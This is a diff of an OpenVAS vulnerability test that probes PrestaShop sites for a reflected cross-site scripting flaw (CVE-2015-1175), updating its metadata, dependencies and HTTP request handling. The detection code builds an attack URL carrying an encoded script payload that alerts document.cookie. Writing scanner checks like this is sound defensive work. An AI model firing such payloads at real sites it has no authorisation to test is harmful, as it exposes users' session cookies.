@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_prestashop_xss_vuln.nasl 3516 2016-06-14 12:25:12Z mime $
+# $Id: gb_prestashop_xss_vuln.nasl 5819 2017-03-31 10:57:23Z cfi $
 #
 # Prestashop Reflected Cross Site Scripting Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805445");
-  script_version("$Revision: 3516 $");
+  script_version("$Revision: 5819 $");
   script_cve_id("CVE-2015-1175");
   script_bugtraq_id(71655);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-14 14:25:12 +0200 (Tue, 14 Jun 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-31 12:57:23 +0200 (Fri, 31 Mar 2017) $");
   script_tag(name:"creation_date", value:"2014-12-17 16:59:56 +0530 (Wed, 17 Dec 2014)");
   script_tag(name:"qod_type", value:"remote_analysis");
   script_name("Prestashop Reflected Cross Site Scripting Vulnerability");
@@ -63,15 +63,14 @@ if(description)
 
   script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/130026");
   script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/534511/100/0/threaded");
-  script_summary("Check if Prestashop is prone to XSS");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
@@ -82,38 +81,24 @@ req = "";
 res = "";
 presPort = "";
 
-## Get HTTP Port
 presPort = get_http_port(default:80);
-if(!presPort){
-  presPort = 80;
-}
-
-## Check the port state
-if(!get_port_state(presPort)){
-  exit(0);
-}
-
-## Check if host supports php
 if(!can_host_php(port:presPort)){
   exit(0);
 }
 
-## Iterate over possible paths
-foreach dir (make_list_unique("/", "/prestashop", cgi_dirs()))
+host = http_host_name( port:presPort );
+
+foreach dir (make_list_unique("/", "/prestashop", cgi_dirs(port:presPort)))
 {
 
   if( dir == "/" ) dir = "";
-
-  ## Send and Receive the response
   url = string(dir, "/");
-  req = string("GET ",url,  " HTTP/1.1\r\n",
-               "Host: ", get_host_name(), "\r\n",
-               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
-  res =  http_keepalive_send_recv(port:presPort, data:req);
+  res = http_get_cache(item:url, port:presPort);
 
   ## Confirm the application
   if(res && 'content="Shop powered by PrestaShop' >< res && '<title>prestashop</title>' >< res)
   {
+
     ## Construct the attack request
     url = dir + "/modules/blocklayered/blocklayered-ajax.php?"+
                 "layered_id_feature_20=20_7&id_category_layered=8&"+
@@ -121,7 +106,7 @@ foreach dir (make_list_unique("/", "/prestashop", cgi_dirs()))
                 "document.cookie%29%3E9c032&orderby=position&orderway=asctrue&_=1420314938300";
 
     req = string("GET ",url,  " HTTP/1.1\r\n",
-               "Host: ", get_host_name(), "\r\n",
+               "Host: ", host, "\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
     res =  http_keepalive_send_recv(port:presPort, data:req);
 
